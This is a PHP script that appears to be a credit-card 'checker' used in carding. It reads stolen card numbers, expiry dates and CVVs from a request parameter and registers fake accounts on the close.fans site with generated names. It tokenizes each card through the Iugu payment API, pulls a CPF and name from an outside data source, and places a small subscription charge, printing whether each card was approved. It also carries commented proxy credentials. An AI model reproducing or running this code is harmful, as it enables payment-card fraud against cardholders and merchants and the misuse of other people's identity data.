<?php
error_reporting(0);

$lista = str_replace(array(" "), '/', $_GET['lista']);
$regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex, $lista)){
    die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida. </span> ➔ <span class="text-warning">@cybersecofc</span><br>');
}

function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = $_REQUEST['lista'];
$cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
$mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
$ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
$cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];

if (strlen($ano) < 4) {
    $ano = "20" . $ano;
}

$dirCcookies = __DIR__.'/cookies/'.uniqid('cookie_').'.txt';

if (!is_dir(__DIR__.'/cookies/')){
  mkdir(__DIR__.'/cookies/' ,0777 , true);
}

foreach (glob(__DIR__."/cookies/*.txt") as $file) {
  if (strpos($file, 'cookie_') !== false){
    unlink($file);
  }
}

function getstr($separa, $inicia, $fim, $contador){
    $nada = explode($inicia, $separa);
    $nada = explode($fim, $nada[$contador]);
    return $nada[0];
}

function detectarBandeira($cc) {
    $bandeiras = [
        'Visa' => '/^4[0-9]{12}(?:[0-9]{3})?$/',
        'Mastercard' => '/^(5[1-5][0-9]{14}|2(?:2[2-9][0-9]{12}|[3-6][0-9]{13}|7[01][0-9]{12}|720[0-9]{12}))$/',
        'Elo' => '/^(401178|401179|431274|438935|451416|457393|4576|457630|457631|457632|504175|506699|50670[0-9]{2}|50671[0-9]{2}|50672[0-9]{2}|50673[0-9]{2}|50674[0-9]{2}|50675[0-9]{2}|50676[0-9]{2}|50677[0-9]{2}|50678[0-9]{2}|50679[0-9]{2}|509000|627780|636297|636368)[0-9]{10,12}$/',
        'Hipercard' => '/^(606282|3841)[0-9]{10,15}$/',
        'Amex' => '/^3[47][0-9]{13}$/',
        'Diners' => '/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/',
        'Discover' => '/^6(?:011|5[0-9]{2})[0-9]{12}$/',
        'Aura' => '/^50[0-9]{14,17}$/',
        'JCB' => '/^(?:2131|1800|35\d{3})\d{11}$/'
    ];

    foreach ($bandeiras as $bandeira => $pattern) {
        if (preg_match($pattern, $cc)) {
            return $bandeira;
        }
    }

    return 'Desconhecida';
}

$primeirosNomes = [
    "Tony", "Steve", "Bruce", "Natasha", "Clint", "Wanda", "Pietro", "Stephen", "Carol", "Sam",
    "Bucky", "T'Challa", "Peter", "Thor", "Loki", "Scott", "Hope", "Gamora", "Nebula", "Rocket",
    "Groot", "Drax", "Mantis", "Shuri", "Okoye", "Vision", "Pepper", "Happy", "Rhodey", "Hank",
    "Janet", "Yondu", "Ego", "Quill", "Jane", "Darcy", "Erik", "Maria", "Nick", "Coulson",
    "Korg", "Valkyrie", "Mjolnir", "Thanos", "Ultron", "Hela", "Killmonger", "Red", "Mystique", "Storm"
];

$sobrenomes = [
    "Stark", "Rogers", "Banner", "Romanoff", "Barton", "Maximoff", "Strange", "Danvers", "Wilson", "Barnes",
    "Panther", "Parker", "Odinson", "Laufeyson", "Lang", "Pym", "Quill", "Raccoon", "Tree", "Destroyer",
    "Rambeau", "VanDyne", "Foster", "Vanko", "Potts", "Rhodes", "Fury", "Hill", "Carter", "Ross",
    "Murdock", "Jones", "Rand", "Cage", "Morales", "Simmons", "May", "Skye", "Ward", "Hunter",
    "Gonzales", "Garrett", "Malick", "Hale", "Talbot", "Raina", "Daisy", "Bennett", "Jemma", "Leopold"
];

for ($i = 0; $i < 100; $i++) {
    $primeiroNome = $primeirosNomes[array_rand($primeirosNomes)];
    $sobrenome = $sobrenomes[array_rand($sobrenomes)];
    $nome = "$primeiroNome $sobrenome";
}

$inicio = microtime(true);
$email = "$primeiroNome" . "$sobrenome" . rand(1,99999);

################################################

/* $influencershot = array(
    'adryellirot',
    'kelsecrets',
    'crisvip',
    'jamilly.vip',
    'miicahferreirah'
);

$userdocriador = $influencershot[array_rand($influencershot)]; */

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://close.fans/api/people/getFeatured',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_COOKIEJAR => $dirCcookies,
  CURLOPT_COOKIEFILE => $dirCcookies,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"category":"main","page":"search"}',
  CURLOPT_HTTPHEADER => [
    'content-type: application/json',
    'host: close.fans',
    'origin: https://close.fans',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
  ],
]);

$buscarusuarios = curl_exec($curl);
$randonizarusers = rand(1,60);
$userdocriador = getstr($buscarusuarios, '"username": "','"' , $randonizarusers);

################################################

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://close.fans/'.$userdocriador.'',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_COOKIEJAR => $dirCcookies,
  CURLOPT_COOKIEFILE => $dirCcookies,
  // CURLOPT_PROXY => 'na.43ffbc799da80117.abcproxy.vip:4950',
  // CURLOPT_PROXYUSERPWD => 'Pt2T5GQHc5-zone-star-region-BR:83321778',
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_HTTPHEADER => [
    'host: close.fans',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
  ],
]);
$getCookies = curl_exec($curl);

################################################

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://close.fans/api/auth/signupWithPassword',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_COOKIEJAR => $dirCcookies,
  CURLOPT_COOKIEFILE => $dirCcookies,
  // CURLOPT_PROXY => 'na.43ffbc799da80117.abcproxy.vip:4950',
  // CURLOPT_PROXYUSERPWD => 'Pt2T5GQHc5-zone-star-region-US:83321778',
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"email":"'.$email.'@gmail.com","password":"MarcioLopes1020@","rememberMe":false}',
  CURLOPT_HTTPHEADER => [
    'content-type: application/json',
    'host: close.fans',
    'origin: https://close.fans',
    'referer: https://close.fans/'.$userdocriador.'/checkout?cf=1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
  ],
]);
$cadastrarAccount = curl_exec($curl);

################################################

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://close.fans/api/checkout/listPaymentOptions',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_COOKIEJAR => $dirCcookies,
  CURLOPT_COOKIEFILE => $dirCcookies,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"creatorUsername":"'.$userdocriador.'"}',
  CURLOPT_HTTPHEADER => [
    'content-type: application/json',
    'host: close.fans',
    'origin: https://close.fans',
    'referer: https://close.fans/'.$userdocriador.'/checkout?cf=1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
  ],
]);

$getCredentials = curl_exec($curl);
$json = json_decode($getCredentials);
$iuguaccount = $json->creditCard->iuguAccountId->save;

################################################

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://close.fans/api/people/loadCreator',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_COOKIEJAR => $dirCcookies,
  CURLOPT_COOKIEFILE => $dirCcookies,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"username":"'.$userdocriador.'"}',
  CURLOPT_HTTPHEADER => [
    'content-type: application/json',
    'host: close.fans',
    'origin: https://close.fans',
    'referer: https://close.fans/'.$userdocriador.'/checkout?cf=1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
  ],
]);
$getCredentialsv2 = curl_exec($curl);
$hashhkk = getstr($getCredentialsv2, '"hash": "','"' , 1);

################################################

$rando = rand(111,999);
$randook = rand(1,9);

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.iugu.com/v1/payment_token?method=credit_card&data[number]='.$cc.'&data[verification_value]='.$cvv.'&data[first_name]='.$primeiroNome.'&data[last_name]='.$sobrenome.'&data[month]='.$mes.'&data[year]='.$ano.'&data[brand]=visa&data[fingerprint]=749c16b4-f69a-e5ca-5b26-3850ad11ab11&data[version]=2.1&account_id='.$iuguaccount.'&callback=callback1735607343882',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_COOKIEJAR => $dirCcookies,
  CURLOPT_COOKIEFILE => $dirCcookies,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
  CURLOPT_HTTPHEADER => [
    'host: api.iugu.com',
    'referer: https://close.fans/'.$userdocriador.'/checkout?cf=1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
  ],
]);

$getToken = curl_exec($curl);

// Melhorar a extração do token e capturar erros da Iugu
$tokencardiugu = '';
$iugu_error = '';

// Extrair o JSON da resposta JSONP
if (preg_match('/callback\d+\(({.*})\)/', $getToken, $matches)) {
    $tokenJson = json_decode($matches[1], true);
    
    // Verificar se tem erro
    if (isset($tokenJson['errors'])) {
        $errors = [];
        foreach ($tokenJson['errors'] as $field => $error) {
            $errors[] = "$field: " . implode(', ', $error);
        }
        $iugu_error = "Erro Iugu: " . implode(' | ', $errors);
    } else if (isset($tokenJson['id'])) {
        $tokencardiugu = $tokenJson['id'];
    }
}

// Se não conseguir extrair, tenta o método antigo
if (empty($tokencardiugu) && empty($iugu_error)) {
    $tokencardiugu = getstr($getToken, '"id":"','"' , 1);
}

// Se tiver erro da Iugu, mostra e morre
if (!empty($iugu_error)) {
    die('<span class="badge badge-danger">Reprovada (Iugu)</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-danger">'.$iugu_error.'</span> ➔ ('.number_format(microtime(true) - $inicio, 2).'s) ➔ <span class="badge badge-warning">cybersec</span><br>');
}

// Se não conseguiu o token
if (empty($tokencardiugu)) {
    die('<span class="badge badge-danger">Erro no Token</span> ➔ <span class="badge badge-light">'.$lista.'</span> ➔ <span class="badge badge-danger">Não foi possível gerar o token do cartão</span> ➔ ('.number_format(microtime(true) - $inicio, 2).'s) ➔ <span class="badge badge-warning">cybersec</span><br>');
}

################################################

$apidadosbr = file_get_contents('https://chellyx.shop/dados/');
$json = json_decode($apidadosbr);
$cpff = $json->cpf;
$nomee = $json->nome;

################################################

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://close.fans/api/checkout/finishMainOffer',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_COOKIEJAR => $dirCcookies,
  CURLOPT_COOKIEFILE => $dirCcookies,
  // CURLOPT_PROXY => 'na.43ffbc799da80117.abcproxy.vip:4950',
  // CURLOPT_PROXYUSERPWD => 'Pt2T5GQHc5-zone-star-region-US:83321778',
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => '{"creatorUsername":"'.$userdocriador.'","hash":"'.$hashhkk.'","paymentData":{"creditCardToken":"'.$tokencardiugu.'","save":true,"receiptName":"'.$nomee.'","cpf":"'.$cpff.'"},"paymentMethod":"credit_card","plan":"monthly"}',
  CURLOPT_HTTPHEADER => [
    'content-type: application/json',
    'host: close.fans',
    'origin: https://close.fans',
    'referer: https://close.fans/'.$userdocriador.'/checkout?cf=1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36'
  ],
]);

$resp = curl_exec($curl);
$infobin = file_get_contents('https://chellyx.shop/dados/binsearch.php?bin=' . substr($cc, 0, 6));
$fim = microtime(true);
$tempoTotal = $fim - $inicio;
$tempoFormatado = number_format($tempoTotal, 2);
$json = json_decode($resp);
$msgg = $json->error;

// "ok": true, "_forwarded_to_authorities": true

if (strpos($resp, '"ok": true') !== false) {

die('<span class="badge badge-success">Aprovada</span> ➔ <span class="badge badge-light">'.$lista.' '.$infobin.'</span> ➔ <span class="badge badge-success">Pagamento confirmado! ➔ (R$10)</span> ➔ ('.$tempoFormatado.'s) ➔ <span class="badge badge-warning"></span><br>');

} elseif (strpos($resp, '"ok": false') !== false) {

die('<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-light">'.$lista.' '.$infobin.'</span> ➔ <span class="badge badge-danger">'.$msgg.'</span> ➔ ('.$tempoFormatado.'s) ➔ <span class="badge badge-warning"></span><br>');

} else {

die('<span class="badge badge-danger">Reprovada</span> ➔ <span class="badge badge-light">'.$lista.' '.$infobin.'</span> ➔ <span class="badge badge-danger">'.$resp.'</span> ➔ ('.$tempoFormatado.'s) ➔ <span class="badge badge-warning"></span><br>');

}

?>
